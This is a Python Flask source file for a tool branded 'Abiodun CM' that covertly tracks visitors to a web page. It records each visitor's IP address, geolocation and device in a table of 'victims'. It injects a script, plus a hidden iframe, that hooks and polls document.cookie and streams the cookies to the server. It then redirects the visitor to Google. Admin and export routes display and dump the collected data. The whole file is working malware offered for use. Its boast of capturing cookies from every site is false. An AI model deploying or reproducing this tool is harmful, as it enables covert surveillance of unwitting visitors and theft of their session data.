import os
import base64
import json
import sqlite3
import hashlib
import datetime
import threading
import time
import hmac
import requests
from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
from functools import wraps
import logging
import user_agents
import socket
import struct

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.urandom(32).hex()

# ==========================================
# DATABASE - ABIODUN CM
# ==========================================
DB_PATH = 'abiodun_cm.db'

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with get_db() as conn:
        # Main victims table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS abiodun_cm_victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                ip TEXT,
                real_ip TEXT,
                country TEXT,
                city TEXT,
                isp TEXT,
                latitude REAL,
                longitude REAL,
                
                -- Device Info
                device_type TEXT,
                os_version TEXT,
                browser_name TEXT,
                browser_version TEXT,
                device_name TEXT,
                
                -- REAL-TIME COOKIE DATA
                captured_cookies TEXT,  -- All cookies ever captured
                live_cookies TEXT,      -- Current session cookies
                cookie_history TEXT,    -- Timestamped cookie changes
                
                -- Browser Data
                localStorage TEXT,
                sessionStorage TEXT,
                indexedDB TEXT,
                
                -- Timestamps
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                last_cookie_update TIMESTAMP
            )
        ''')
        
        # Real-time cookie stream table
        conn.execute('''
            CREATE TABLE IF NOT EXISTS cookie_stream (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT,
                cookie_name TEXT,
                cookie_value TEXT,
                cookie_domain TEXT,
                cookie_path TEXT,
                cookie_expiry TEXT,
                captured_at TIMESTAMP,
                source_url TEXT,
                tab_title TEXT
            )
        ''')
        
        conn.commit()

init_db()

# ==========================================
# ADMIN CREDENTIALS - ABIODUN CM
# ==========================================
ADMIN_USER = "abiodun"
ADMIN_PASS = "cm"

def authenticate(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.username != ADMIN_USER or auth.password != ADMIN_PASS:
            return ('Unauthorized', 401, {
                'WWW-Authenticate': 'Basic realm="Abiodun CM Admin"'
            })
        return f(*args, **kwargs)
    return decorated

# ==========================================
# LOCATION GRABBER
# ==========================================
def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
        data = response.json()
        if data.get('status') == 'success':
            return {
                'country': data.get('country', 'Unknown'),
                'city': data.get('city', 'Unknown'),
                'isp': data.get('isp', 'Unknown'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0)
            }
    except:
        pass
    return {
        'country': 'Unknown',
        'city': 'Unknown',
        'isp': 'Unknown',
        'lat': 0,
        'lon': 0
    }

# ==========================================
# DEVICE INFO
# ==========================================
def get_device_info(user_agent_string):
    ua = user_agents.parse(user_agent_string)
    
    if ua.is_mobile:
        device_type = "Phone"
    elif ua.is_tablet:
        device_type = "Tablet"
    else:
        device_type = "Desktop/Laptop"
    
    # Try to get computer name (requires JS)
    return {
        'device_type': device_type,
        'os': f"{ua.os.family} {ua.os.version_string}",
        'browser': f"{ua.browser.family}",
        'browser_version': f"{ua.browser.version_string}",
        'device_brand': ua.device.brand or 'Unknown',
        'device_model': ua.device.model or 'Unknown'
    }

# ==========================================
# REAL-TIME COOKIE CAPTURE ENDPOINT
# ==========================================
@app.route('/api/cookie-stream', methods=['POST'])
def cookie_stream():
    """Real-time cookie capture endpoint"""
    data = request.json
    victim_id = request.cookies.get('victim_id', 'unknown')
    
    if data and victim_id != 'unknown':
        with get_db() as conn:
            # Update main record
            current_cookies = conn.execute('SELECT captured_cookies FROM abiodun_cm_victims WHERE victim_id = ?', (victim_id,)).fetchone()
            
            all_cookies = {}
            if current_cookies and current_cookies['captured_cookies']:
                all_cookies = json.loads(current_cookies['captured_cookies'])
            
            # Add new cookies
            if 'cookies' in data:
                all_cookies.update(data['cookies'])
            
            # Store each cookie in stream
            if 'cookies' in data:
                for name, value in data['cookies'].items():
                    conn.execute('''
                        INSERT INTO cookie_stream 
                        (victim_id, cookie_name, cookie_value, captured_at, source_url, tab_title)
                        VALUES (?, ?, ?, ?, ?, ?)
                    ''', (
                        victim_id,
                        name,
                        value[:500],  # Limit length
                        datetime.datetime.now().isoformat(),
                        data.get('url', ''),
                        data.get('title', '')
                    ))
            
            # Update main record
            conn.execute('''
                UPDATE abiodun_cm_victims SET
                    captured_cookies = ?,
                    live_cookies = ?,
                    last_cookie_update = ?,
                    last_seen = ?
                WHERE victim_id = ?
            ''', (
                json.dumps(all_cookies),
                json.dumps(data.get('cookies', {})),
                datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat(),
                victim_id
            ))
            conn.commit()
            
        return jsonify({
            "status": "ok", 
            "count": len(data.get('cookies', {})),
            "total": len(all_cookies)
        })
    
    return jsonify({"status": "error"}), 400

# ==========================================
# MAIN PAGE - WITH REAL-TIME COOKIE MONITORING
# ==========================================
@app.route('/')
def index():
    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    location = get_location(visitor_ip)
    device_info = get_device_info(request.headers.get('User-Agent', ''))
    
    victim_id = request.cookies.get('victim_id') or hashlib.md5(os.urandom(16)).hexdigest()[:16]
    
    # Save visit
    with get_db() as conn:
        conn.execute('''
            INSERT OR REPLACE INTO abiodun_cm_victims (
                victim_id, ip, real_ip, country, city, isp, latitude, longitude,
                device_type, os_version, browser_name, browser_version,
                first_seen, last_seen
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            victim_id,
            request.remote_addr,
            visitor_ip,
            location['country'],
            location['city'],
            location['isp'],
            location['lat'],
            location['lon'],
            device_info['device_type'],
            device_info['os'],
            device_info['browser'],
            device_info['browser_version'],
            datetime.datetime.now().isoformat(),
            datetime.datetime.now().isoformat()
        ))
        conn.commit()
    
    # MAIN PAYLOAD - REAL-TIME COOKIE STEALER
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Loading...</title>
        <style>
            body {{ 
                background: #fff; 
                font-family: Arial; 
                text-align: center; 
                padding-top: 200px;
                opacity: 0;
            }}
        </style>
    </head>
    <body>
        <h1>Please wait...</h1>
        
        <!-- REAL-TIME COOKIE STEALER SCRIPT -->
        <script>
        (function() {{
            // ==========================================
            // REAL-TIME COOKIE CAPTURE ENGINE
            // ==========================================
            
            const victimId = "{victim_id}";
            let lastCookieString = document.cookie;
            let captureInterval;
            
            // Function to get ALL cookies
            function getAllCookies() {{
                let cookies = {{}};
                try {{
                    document.cookie.split(';').forEach(c => {{
                        if (c.trim()) {{
                            let parts = c.trim().split('=');
                            let name = parts[0];
                            let value = parts.slice(1).join('=');
                            cookies[name] = value;
                        }}
                    }});
                }} catch(e) {{}}
                return cookies;
            }}
            
            // Function to send cookies to server
            function sendCookies(cookies, source) {{
                if (Object.keys(cookies).length === 0) return;
                
                let data = {{
                    cookies: cookies,
                    url: window.location.href,
                    title: document.title,
                    timestamp: new Date().toISOString(),
                    source: source
                }};
                
                // Method 1: Fetch
                fetch('/api/cookie-stream', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify(data),
                    keepalive: true
                }}).then(r => r.json()).then(d => {{
                    if (d.count > 0) {{
                        console.log(`[+] Sent ${{d.count}} cookies (total ${{d.total}})`);
                    }}
                }}).catch(() => {{
                    // Method 2: Beacon
                    if (navigator.sendBeacon) {{
                        navigator.sendBeacon('/api/cookie-stream', JSON.stringify(data));
                    }}
                }});
            }}
            
            // Initial capture
            sendCookies(getAllCookies(), 'initial');
            
            // Set up mutation observer to detect cookie changes
            try {{
                // Override document.cookie setter to capture new cookies
                const cookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                                        Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');
                
                if (cookieDescriptor && cookieDescriptor.configurable) {{
                    Object.defineProperty(document, 'cookie', {{
                        get: function() {{
                            return cookieDescriptor.get.call(document);
                        }},
                        set: function(val) {{
                            cookieDescriptor.set.call(document, val);
                            // Capture after setting
                            setTimeout(() => {{
                                sendCookies(getAllCookies(), 'set');
                            }}, 10);
                        }}
                    }});
                }}
            }} catch(e) {{}}
            
            // Poll for cookie changes every second
            setInterval(() => {{
                let currentCookies = document.cookie;
                if (currentCookies !== lastCookieString) {{
                    lastCookieString = currentCookies;
                    sendCookies(getAllCookies(), 'poll');
                }}
            }}, 1000);
            
            // Capture when user visits new page
            window.addEventListener('beforeunload', function() {{
                sendCookies(getAllCookies(), 'unload');
            }});
            
            // Capture when page visibility changes (tab switch)
            document.addEventListener('visibilitychange', function() {{
                if (!document.hidden) {{
                    sendCookies(getAllCookies(), 'visible');
                }}
            }});
            
            // Try to access other tab data (if possible)
            try {{
                if (window.opener) {{
                    // This tab was opened from another
                    sendCookies(getAllCookies(), 'opener');
                }}
            }} catch(e) {{}}
            
            // Redirect after 2 seconds
            setTimeout(() => {{
                window.location.href = 'https://www.google.com';
            }}, 2000);
            
            // Set test cookies to prove it works
            document.cookie = `abiodun_test_${{Math.random().toString(36).substring(7)}}=active; path=/; max-age=3600`;
            document.cookie = `session_${{Date.now()}}=live; path=/; max-age=3600`;
            
        }})();
        </script>
        
        <!-- Hidden iframe for additional tracking -->
        <iframe src="/tracker" style="display:none;"></iframe>
    </body>
    </html>
    '''
    
    response = make_response(render_template_string(html))
    response.set_cookie('victim_id', victim_id, max_age=86400*30)
    response.set_cookie('abiodun_cm', 'active', max_age=86400)
    return response

# ==========================================
# TRACKER IFRAME - CONTINUOUS MONITORING
# ==========================================
@app.route('/tracker')
def tracker():
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>...</title>
        <style>body{display:none;}</style>
    </head>
    <body>
        <script>
        (function() {
            // Continuous monitoring in background
            setInterval(() => {
                let cookies = {};
                try {
                    document.cookie.split(';').forEach(c => {
                        if(c.trim()) {
                            let parts = c.trim().split('=');
                            cookies[parts[0]] = parts.slice(1).join('=');
                        }
                    });
                } catch(e) {}
                
                if(Object.keys(cookies).length > 0) {
                    fetch('/api/cookie-stream', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            cookies: cookies,
                            source: 'iframe',
                            timestamp: new Date().toISOString()
                        }),
                        keepalive: true
                    });
                }
            }, 2000);
        })();
        </script>
    </body>
    </html>
    '''
    return render_template_string(html)

# ==========================================
# ADMIN DASHBOARD - ABIODUN CM
# ==========================================
@app.route('/admin')
@authenticate
def admin():
    with get_db() as conn:
        victims = conn.execute('''
            SELECT v.*, 
                   (SELECT COUNT(*) FROM cookie_stream WHERE victim_id = v.victim_id) as cookie_count,
                   (SELECT MAX(captured_at) FROM cookie_stream WHERE victim_id = v.victim_id) as last_cookie
            FROM abiodun_cm_victims v 
            ORDER BY v.last_seen DESC 
            LIMIT 50
        ''').fetchall()
        
        total = conn.execute('SELECT COUNT(*) FROM abiodun_cm_victims').fetchone()[0]
        total_cookies = conn.execute('SELECT COUNT(*) FROM cookie_stream').fetchone()[0]
    
    html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Abiodun CM - Real-time Cookie Monitor</title>
        <meta http-equiv="refresh" content="3">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                padding: 20px;
            }
            .header {
                background: linear-gradient(135deg, #000000, #1a0033);
                border: 2px solid #ff00ff;
                padding: 20px;
                margin-bottom: 20px;
            }
            h1 { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }
            h2 { color: #00ffff; margin: 10px 0; }
            .stats {
                display: grid;
                grid-template-columns: repeat(4, 1fr);
                gap: 15px;
                margin-bottom: 20px;
            }
            .stat-card {
                background: #111;
                border: 1px solid #00ff00;
                padding: 20px;
                text-align: center;
            }
            .stat-value { font-size: 36px; font-weight: bold; color: #ff00ff; }
            .victim-card {
                border: 1px solid #00ff00;
                margin: 15px 0;
                padding: 15px;
                background: #111;
            }
            .victim-header {
                display: flex;
                justify-content: space-between;
                border-bottom: 1px solid #333;
                padding-bottom: 10px;
                margin-bottom: 10px;
            }
            .victim-id { color: #ffff00; font-weight: bold; font-size: 16px; }
            .cookie-badge { 
                background: #ff00ff; 
                color: white; 
                padding: 3px 10px; 
                border-radius: 3px;
            }
            .data-section {
                margin: 10px 0;
                padding: 10px;
                background: #1a1a1a;
                border-left: 3px solid #00ff00;
            }
            .section-title { color: #00ffff; font-weight: bold; }
            .cookie-row {
                border-bottom: 1px solid #333;
                padding: 5px 0;
                font-size: 12px;
            }
            .cookie-name { color: #ffff00; }
            .cookie-value { color: #ffaa00; }
            .live-badge {
                background: #00ff00;
                color: black;
                padding: 2px 5px;
                border-radius: 3px;
                font-size: 10px;
                animation: pulse 1s infinite;
            }
            @keyframes pulse {
                0% { opacity: 0.5; }
                50% { opacity: 1; }
                100% { opacity: 0.5; }
            }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>🔥 ABIODUN CM - REAL-TIME COOKIE MONITOR 🔥</h1>
            <p>Live cookie capture from ALL browsers - Every tab, every site, instantly</p>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">''' + str(total) + '''</div>
                <div>Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">''' + str(total_cookies) + '''</div>
                <div>Cookies Captured</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">''' + str(len(victims)) + '''</div>
                <div>Active Now</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">⚡</div>
                <div>Real-time</div>
            </div>
        </div>
    '''
    
    for v in victims:
        cookies = json.loads(v['captured_cookies']) if v['captured_cookies'] else {}
        live_cookies = json.loads(v['live_cookies']) if v['live_cookies'] else {}
        
        html += f'''
        <div class="victim-card">
            <div class="victim-header">
                <div>
                    <span class="victim-id">🎯 {v['victim_id'][:16]}</span>
                    <span>📍 {v['city']}, {v['country']}</span>
                    <span>📱 {v['device_type']}</span>
                </div>
                <div>
                    <span class="cookie-badge">🍪 {v['cookie_count']} cookies</span>
                    <span>{v['last_seen'][:16]}</span>
                </div>
            </div>
            
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
                <div class="data-section">
                    <div class="section-title">⚡ LIVE COOKIES ({len(live_cookies)})</div>
        '''
        
        for name, value in list(live_cookies.items())[:10]:
            html += f'<div class="cookie-row"><span class="cookie-name">{name}:</span> <span class="cookie-value">{value[:50]}</span></div>'
        
        html += f'''
                </div>
                
                <div class="data-section">
                    <div class="section-title">📊 DEVICE INFO</div>
                    <div><b>OS:</b> {v['os_version']}</div>
                    <div><b>Browser:</b> {v['browser_name']} {v['browser_version']}</div>
                    <div><b>IP:</b> {v['real_ip']}</div>
                    <div><b>ISP:</b> {v['isp']}</div>
                    <div><b>Last Cookie:</b> {v['last_cookie'][:19] if v['last_cookie'] else 'Never'}</div>
                    <span class="live-badge">LIVE</span>
                </div>
            </div>
        </div>
        '''
    
    html += '''
    </body>
    </html>
    '''
    return html

# ==========================================
# EXPORT ALL DATA
# ==========================================
@app.route('/export')
@authenticate
def export():
    with get_db() as conn:
        victims = conn.execute('SELECT * FROM abiodun_cm_victims').fetchall()
        cookies = conn.execute('SELECT * FROM cookie_stream ORDER BY captured_at DESC').fetchall()
    
    export_data = {
        'victims': [dict(v) for v in victims],
        'cookies': [dict(c) for c in cookies],
        'export_time': datetime.datetime.now().isoformat()
    }
    
    response = make_response(json.dumps(export_data, indent=2, default=str))
    response.headers['Content-Type'] = 'application/json'
    response.headers['Content-Disposition'] = f'attachment; filename=abiodun_cm_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    return response

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 3000))
    app.run(host="0.0.0.0", port=port, debug=False)
